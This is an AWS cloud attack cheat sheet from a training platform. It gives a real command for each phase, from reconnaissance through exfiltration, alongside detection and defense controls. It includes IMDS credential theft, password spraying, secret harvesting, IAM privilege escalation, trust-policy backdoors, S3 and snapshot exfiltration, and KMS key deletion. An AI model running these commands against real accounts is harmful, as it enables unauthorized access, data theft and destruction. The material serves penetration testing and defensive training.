# AWS Cloud Attack Cheat Sheet

A phase-by-phase offensive security reference for AWS, with a real command for every technique. Maintained by [Pwned Labs](https://pwnedlabs.io), which teaches these attacks and their defenses hands-on in live AWS environments through Academy labs and the Amazon Cloud Attack and Defense bootcamp (ACRTP).

The full interactive version, with one-click copy for every command, is at **[https://pwnedlabs.io/resources/aws-cloud-attack-cheat-sheet](https://pwnedlabs.io/resources/aws-cloud-attack-cheat-sheet)**.

---

## How to use this cheat sheet

Each section is one phase of an AWS attack. Every row names a technique, gives a real command you can copy, states what the command gives you, and names the control that detects or prevents it. Resource-specific values are written in angle brackets, so swap in a real bucket, role ARN or user name before you run anything.

A black-box tester cannot see inside an account until they hold a credential or a role, so the early phases are about finding that first foothold, and the later phases assume one API identity and work toward more access and data. Run these techniques only against accounts you own or have written permission to test.

## Reconnaissance and enumeration

The aim is situational awareness: which account you are looking at, what is exposed publicly, and what the current identity is allowed to do. Some of this works before any valid credential, from error messages and public resources.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Confirm the current identity | `aws sts get-caller-identity` | The account ID, and the user or role behind the keys. | Expected call, but alert on it from unfamiliar source IPs in CloudTrail. |
| Recover an account ID from a public bucket ([s3-account-search](https://github.com/WeAreCloudar/s3-account-search)) | `s3-account-search arn:aws:iam::<your-acct>:role/<role> <target-bucket>` | The 12-digit account ID behind a public S3 bucket, one digit at a time. | Keep bucket names and role ARNs out of public pages and client-side code. |
| Find readable buckets with no credential | `aws s3 ls s3://<bucket> --no-sign-request` | Objects in a bucket that allows anonymous list access. | S3 Block Public Access at the account and bucket level. |
| List publicly shared snapshots | `aws ec2 describe-snapshots --owner-ids <acct> --region us-west-2` | EBS snapshots an account shared publicly, ready to copy. | Never share snapshots publicly; audit sharing with AWS Config. |
| Brute force IAM permissions ([aws-enumerator](https://github.com/shabarkin/aws-enumerator)) | `aws-enumerator cred -aws_access_key_id <id> -aws_secret_access_key <secret> -aws_region us-west-2 aws-enumerator enum -services all aws-enumerator dump -services iam` | The read and list actions a set of keys can call, by service. | GuardDuty and CloudTrail flag bursts of denied API calls. |
| Brute force IAM permissions ([enumerate-iam](https://github.com/andresriancho/enumerate-iam)) | `./enumerate-iam.py --access-key <id> --secret-key <secret>` | Every non-destructive get and list call the credential is allowed. | Same signal: a spike of AccessDenied events across many services. |
| Enumerate permissions ([Pacu](https://github.com/RhinoSecurityLabs/pacu)) | `pacu set_keys run iam__bruteforce_permissions` | A stored permission map you can feed to later Pacu modules. | Monitor for wide read sweeps; restrict keys to least privilege. |
| Map the account fast ([CloudFox](https://github.com/BishopFox/cloudfox)) | `cloudfox aws --profile <profile> all-checks` | Secrets in userdata, admin roles, role trusts, endpoints and loot files. | Run the same tool yourself and close the paths it surfaces. |
| Graph privilege escalation paths ([PMapper](https://github.com/nccgroup/PMapper)) | `pmapper --profile <profile> graph create pmapper --profile <profile> query 'preset privesc *'` | Which identities can reach administrator through a chain of permissions. | Fix the edges PMapper reports; re-run after IAM changes. |

Pwned Labs runs this phase as hands-on labs, from [Intro to AWS IAM Enumeration](https://pwnedlabs.io/explore/intro-to-aws-iam-enumeration) to [Get Situational Awareness in AWS with CloudFox](https://pwnedlabs.io/explore/get-situational-awareness-in-aws-with-cloudfox).

## Initial access

Initial access turns an external position into a first valid AWS identity. The common roots are a leaked long-term key, a guessable console password, and a web vulnerability such as command injection or SSRF that reaches the EC2 instance metadata service at 169.254.169.254. Once a vulnerable endpoint runs commands for you, point it at the metadata path in the first row to read the instance role credentials.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Read EC2 role credentials over IMDSv2 | `TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600") curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | Temporary AccessKeyId, SecretAccessKey and Token for the instance role. | Enforce IMDSv2 and set the metadata hop limit to 1. |
| Spray the console ([GoAWSConsoleSpray](https://github.com/WhiteOakSecurity/GoAWSConsoleSpray)) | `GoAWSConsoleSpray -a <acct> -u users.txt -p passwords.txt` | A valid console password for a known IAM user, and whether MFA is set. | Enforce MFA and a strong password policy; alert on failed logins. |
| Fuzz for an exposed .env or config ([ffuf](https://github.com/ffuf/ffuf)) | `ffuf -w wordlist.txt -u http://<target>/.FUZZ` | Exposed files such as .env that often hold AWS keys in plaintext. | Block access to dotfiles; keep secrets out of the web root. |
| Hunt leaked keys in a repo ([TruffleHog](https://github.com/trufflesecurity/trufflehog)) | `trufflehog filesystem ./<repo>` | Live AKIA keys committed to source, history or build artifacts. | Scan with [git-secrets](https://github.com/awslabs/git-secrets) in CI; prefer short-lived role credentials. |
| Validate found keys before using them | `AWS_ACCESS_KEY_ID=<id> AWS_SECRET_ACCESS_KEY=<secret> aws sts get-caller-identity` | Confirms a leaked key is live and shows the identity it belongs to. | Rotate exposed keys fast; prefer short-lived role credentials; alert on use from new IPs. |

The free [SSRF to Pwned](https://pwnedlabs.io/explore/ssrf-to-pwned) lab walks the metadata route end to end, and [Hunt for Secrets in Git Repos](https://pwnedlabs.io/explore/hunt-for-secrets-in-git-repos) covers the leaked-key route.

## Credential access

Once inside, attackers harvest more credentials from the services an identity can read. Secrets sit in managed stores, in function configuration, and in places developers forget, such as old object versions and launch template user data.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Read a managed secret | `aws secretsmanager list-secrets aws secretsmanager get-secret-value --secret-id <arn>` | The plaintext value of a Secrets Manager secret. | Tight resource policies; watch GuardDuty CredentialAccess findings. |
| Read SSM Parameter Store | `aws ssm get-parameters-by-path --path / --recursive --with-decryption` | Decrypted SecureString parameters across the parameter tree. | Scope ssm:GetParameter* by path; log decryption with CloudTrail. |
| Pull Lambda config and source | `aws lambda list-functions aws lambda get-function --function-name <fn>` | Environment variables and a download link to the function code. | Keep secrets in a vault, not env vars; review function policies. |
| Read EC2 launch template user data | `aws ec2 describe-launch-template-versions --launch-template-id <lt-id> --versions '$Latest' --query 'LaunchTemplateVersions[0].LaunchTemplateData.UserData' --output text \| base64 -d` | Bootstrap scripts that often embed keys or deploy tokens. | Never put secrets in user data; pull them at boot from a vault. |
| Recover a secret from an old object version | `aws s3api list-object-versions --bucket <bucket>` | An older object version still holding a secret a newer version removed. | Treat version history as sensitive; scan buckets with Macie. |
| Enumerate databases for connection strings | `aws rds describe-db-instances` | RDS and Aurora endpoints to pair with any credentials you have found. | Rotate credentials; use IAM database authentication where possible. |

Pwned Labs teaches the version-history route in its free [Access Secrets with S3 Bucket Versioning](https://pwnedlabs.io/explore/access-secrets-with-s3-bucket-versioning) lab.

## Privilege escalation

AWS privilege escalation is usually an IAM misconfiguration rather than a software bug: a principal uses a permission it already holds to grant itself more. The classic lever is `iam:PassRole` combined with a service that will run code under the passed role.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Pass a privileged role to Lambda | `aws lambda create-function --function-name x --runtime python3.12 --role <privileged-role-arn> --handler index.handler --zip-file fileb://f.zip` | Code execution under a far more privileged role (needs iam:PassRole). | Restrict PassRole with a condition on iam:PassedToService and the role ARN. |
| Roll a policy back to a permissive version | `aws iam list-policy-versions --policy-arn <arn> aws iam set-default-policy-version --policy-arn <arn> --version-id v1` | A broader older policy version becomes the default again. | Alert on SetDefaultPolicyVersion; keep least privilege on iam:*. |
| Attach an admin policy | `aws iam attach-user-policy --user-name <u> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess` | Administrator access granted to a user you control. | Permission boundaries; deny self-service IAM writes. |
| Chain into a more privileged role | `aws sts assume-role --role-arn <role-arn> --role-session-name s` | Temporary credentials for a role whose trust policy you can satisfy. | Scope trust policies; keep any External ID secret. |
| Find escalation paths automatically ([Pacu](https://github.com/RhinoSecurityLabs/pacu)) | `pacu run iam__privesc_scan` | A ranked list of escalation methods the current keys can reach. | Run PMapper or Pacu yourself and fix the reported methods. |

Pwned Labs covers these paths in depth in its [AWS privilege escalation write-up](https://pwnedlabs.io/blog/aws-privilege-escalation) and teaches the policy-rollback path in the [Escalate Privileges by IAM Policy Rollback](https://pwnedlabs.io/explore/escalate-privileges-by-iam-policy-rollback) lab.

## Lateral movement

Lateral movement crosses from one identity, service or account to another. Trust relationships are the usual bridge: a role another party can assume, a key reused across hosts, or a federated login that maps to an AWS role.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Find bypassable GitHub OIDC trust ([github-oidc-checker](https://github.com/Rezonate-io/github-oidc-checker)) | `python3 aws-oidc-tester.py` | IAM roles whose GitHub OIDC trust subject condition is too loose. | Pin the sub claim to a specific repo and branch; audit OIDC roles. |
| Reuse a recovered SSH or deploy key | `chmod 600 deploy.key ssh -i deploy.key git@github.com` | Which repository a leaked deploy key opens, shown in the greeting. | Rotate keys; scope deploy keys to one repository. |
| Clone a private repo with a found key | `GIT_SSH_COMMAND='ssh -i deploy.key -o IdentitiesOnly=yes' git clone git@github.com:<org>/<repo>` | Source code and any further secrets committed to it. | Rotate the key; review repo access and secret scanning. |
| Authenticate to ECR and pull an image | `aws ecr get-login-password --region <r> \| docker login --username AWS --password-stdin <acct>.dkr.ecr.<r>.amazonaws.com aws ecr describe-repositories docker pull <acct>.dkr.ecr.<r>.amazonaws.com/<repo>:latest` | Container images to inspect offline for embedded secrets. | Scan images on push; keep secrets out of image layers. |
| Mint credentials from an open Cognito pool | `aws cognito-identity get-id --identity-pool-id <pool> --region us-west-2 aws cognito-identity get-open-id-token --identity-id <id> --region us-west-2 aws sts assume-role-with-web-identity --role-arn <role-arn> --role-session-name s --web-identity-token <token>` | Credentials for the pool role when unauthenticated identities are allowed. | Disable unauthenticated identities; scope the pool role tightly. |

Pwned Labs covers the federated route in its [Abuse OpenID Connect and GitLab for AWS Access](https://pwnedlabs.io/explore/abuse-openid-connect-and-gitlab-for-aws-access) lab.

## Persistence

Persistence keeps access after the first foothold is closed. Most techniques are ordinary IAM write calls, which is what makes them quiet: they look like administration.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Add a second access key to a user | `aws iam create-access-key --user-name <u>` | A fresh long-term key pair on a compromised or targeted user. | Alert on CreateAccessKey; limit keys per user. |
| Add a console login profile | `aws iam create-login-profile --user-name <u> --password <pw> --no-password-reset-required` | Console access for a user that previously had API keys only. | CloudTrail detection on CreateLoginProfile; restrict iam:CreateUser. |
| Backdoor a role trust policy | `aws iam update-assume-role-policy --role-name <r> --policy-document file://trust.json` | A role that now also trusts an attacker-controlled account. | Alert on trust-policy changes; use IAM Access Analyzer external findings. |
| Backdoor a resource policy | `aws lambda add-permission --function-name <fn> --statement-id x --action lambda:InvokeFunction --principal <attacker-acct>` | Cross-account invoke on a Lambda, bucket or KMS key. | Review resource policies; deny external principals by default. |

Honey credentials make this phase loud. Pwned Labs teaches that defense in its [Detect Malicious Activity with AWS Honey Tokens](https://pwnedlabs.io/explore/detect-malicious-activity-with-aws-honey-tokens) lab.

## Impact: exfiltration and disruption

Impact is where an attacker demonstrates harm: moving data out, or denying the owner access to it. Many impact techniques reuse legitimate AWS features, so they blend into normal traffic unless logging and alerting are in place.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Exfiltrate an S3 bucket | `aws s3 cp s3://<bucket>/ . --recursive` | A full local copy of every object the identity can read. | Block Public Access; S3 data-event logging; egress monitoring. |
| Copy a snapshot to an attacker account | `aws ec2 copy-snapshot --source-region us-east-1 --source-snapshot-id <snap> --region <attacker-region>` | A disk image moved into infrastructure the attacker owns. | Restrict snapshot sharing and copy actions with SCPs. |
| Dump a DynamoDB table | `aws dynamodb scan --table-name <table>` | Every item in the table, including credentials and tokens. | Least privilege; alert on large or unusual read volumes. |
| Push data out through SNS | `aws sns publish --topic-arn <arn> --message "<data>"` | A covert exfiltration channel to an external subscriber. | Scope SNS and SQS policies; alert on new subscriptions. |
| Schedule KMS key deletion (destruction) | `aws kms schedule-key-deletion --key-id <id> --pending-window-in-days 7` | Pending destruction of a key, which can make data unrecoverable. | Backups; KMS key policies; deletion protection; GuardDuty. |

Pwned Labs runs the S3 exfiltration path as its [Abuse S3 Replication and Batch Ops to Exfiltrate Data](https://pwnedlabs.io/explore/abuse-s3-replication-and-batch-ops-to-exfiltrate-data) lab.

## Detection and defense

The controls below cut across every phase above. The pattern that holds up best is least privilege first, then full logging, then automated detection on top. The same offensive tools make good auditors when you run them against your own account.

| Control or tool | Command | What it does | Notes |
| --- | --- | --- | --- |
| Enforce IMDSv2 | `aws ec2 modify-instance-metadata-options --instance-id <id> --http-tokens required --http-put-response-hop-limit 1 --http-endpoint enabled` | Closes the SSRF-to-credentials route on EC2. | Require tokens and keep the hop limit at 1. |
| Baseline misconfiguration ([Prowler](https://github.com/prowler-cloud/prowler)) | `prowler aws --profile <profile>` | Hundreds of checks mapped to CIS and AWS best-practice frameworks. | Triage criticals and highs first; re-run on a schedule. |
| Audit configuration ([ScoutSuite](https://github.com/nccgroup/ScoutSuite)) | `scout aws --profile <profile>` | An offline HTML report of the account attack surface. | Pairs well with Prowler for coverage. |
| Find abusable IAM grants ([pathbreak-audit](https://github.com/pathbreak-io/pathbreak-audit)) | `pathbreak-audit --profile <profile>` | Flags IAM roles and users that hold escalation, persistence or log-tampering permissions, and toxic combinations a one-policy-at-a-time review misses, such as iam:PassRole with ec2:RunInstances. Every finding carries the least-privilege fix. | Read-only, point-in-time, single account. Needs SecurityAudit or ViewOnlyAccess; credentials and findings stay on your machine. |
| Find external exposure | `aws accessanalyzer list-findings --analyzer-arn <arn>` | Roles and resources reachable by external principals. | Review external-access and unused-access findings. |
| Hunt in CloudTrail with Athena | `SELECT eventname, useridentity.arn, sourceipaddress FROM cloudtrail_logs WHERE errorcode = 'AccessDenied' ORDER BY eventtime DESC;` | Denied-call bursts and anomalous principals, after the fact. | All regions, management and S3 data events, locked from tampering. |

Pwned Labs teaches the detection side too, including [Identify IAM Breaches with CloudTrail and Athena](https://pwnedlabs.io/explore/identify-iam-breaches-with-cloudtrail-and-athena), so the same account can be attacked and then defended. GuardDuty, Macie and AWS Config round out managed detection, sensitive-data discovery and drift monitoring.

## Practice this at Pwned Labs

The fastest way from this cheat sheet to real skill is the **[Amazon Cloud Attack and Defense bootcamp](https://pwnedlabs.io/bootcamps/placrtp-bootcamp)**, which runs every phase above against live AWS accounts and certifies the skill with the ACRTP exam. The free labs below are the way in.

Reading a cheat sheet is one thing; running the techniques against a real account is what makes them stick. These labs run in live AWS environments and the first four below are free.

- **[SSRF to Pwned](https://pwnedlabs.io/explore/ssrf-to-pwned)** (Free, Beginner): turn a server-side request forgery bug into EC2 role credentials through the instance metadata service.
- **[Loot Public EBS Snapshots](https://pwnedlabs.io/explore/loot-public-ebs-snapshots)** (Free, Beginner): find an EBS snapshot shared publicly, copy it into your own account and recover the data on it.
- **[Intro to AWS IAM Enumeration](https://pwnedlabs.io/explore/intro-to-aws-iam-enumeration)** (Free, Beginner): list and read IAM users, roles, groups and policies with the AWS CLI to map a foothold.
- **[Identify IAM Breaches with CloudTrail and Athena](https://pwnedlabs.io/explore/identify-iam-breaches-with-cloudtrail-and-athena)** (Free, Beginner): hunt IAM abuse in CloudTrail logs with Athena, the defender side of these techniques.
- **[Get Situational Awareness in AWS with Cloudfox](https://pwnedlabs.io/explore/get-situational-awareness-in-aws-with-cloudfox)** (Premium, Beginner): map an account fast with CloudFox and spot the privilege escalation paths it surfaces.

Browse the full set at [pwnedlabs.io/explore](https://pwnedlabs.io/explore).

## Frequently asked questions

### What are the main phases of an AWS attack?

Most AWS attacks move through reconnaissance and enumeration, initial access, credential access, privilege escalation, lateral movement, persistence and impact. The phases are not always linear, but naming them helps a tester plan coverage and helps a defender decide what to log and alert on.

### How do attackers get initial access to AWS?

The common roots are a leaked long-term access key found in a .env file, git history or a container image, a guessable console password reached by spraying, and a web vulnerability such as SSRF that lets an attacker read EC2 role credentials from the instance metadata service.

### What is iam:PassRole and why is it dangerous?

iam:PassRole lets a principal hand an IAM role to an AWS service. On its own it is normal, but combined with a permission to create a Lambda function, launch an EC2 instance or run a task, it lets a low-privileged identity run code under a far more privileged role. Restrict it with a condition on the target service and role ARN.

### How does SSRF lead to AWS credential theft?

A server-side request forgery bug lets an attacker make the server request a URL of their choosing. Pointed at the instance metadata service at 169.254.169.254, that request can return the temporary credentials of the EC2 role. Enforcing IMDSv2 and setting the metadata hop limit to 1 closes most of this route.

### Which tools do AWS penetration testers use?

Common offensive tools include CloudFox and Pacu for enumeration and exploitation, PMapper for privilege escalation paths, aws-enumerator and enumerate-iam for permission brute forcing, and s3-account-search for account IDs. On defense, Prowler and ScoutSuite baseline the account. Pwned Labs teaches these tools hands-on in live AWS environments.

### Where can I practice AWS offensive security safely?

Pwned Labs runs AWS attack and defense labs in live, isolated AWS environments, from free beginner labs on IAM enumeration and SSRF to the Amazon Cloud Attack and Defense bootcamp that leads to the ACRTP certification. Nothing here should be run against systems you do not own or have written permission to test.

**About Pwned Labs**

Pwned Labs is a hands-on cloud and AI offensive security training platform. It runs real-world attack labs and bootcamps for AWS, Azure, GCP, Kubernetes and AI systems, including the ACRTP, MCRTP, GCRTP, KRTP and AISRTP certifications. Free labs are at [pwnedlabs.io/explore](https://pwnedlabs.io/explore).

---

## License

Published by Pwned Labs under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Share and adapt with attribution to Pwned Labs (https://pwnedlabs.io).
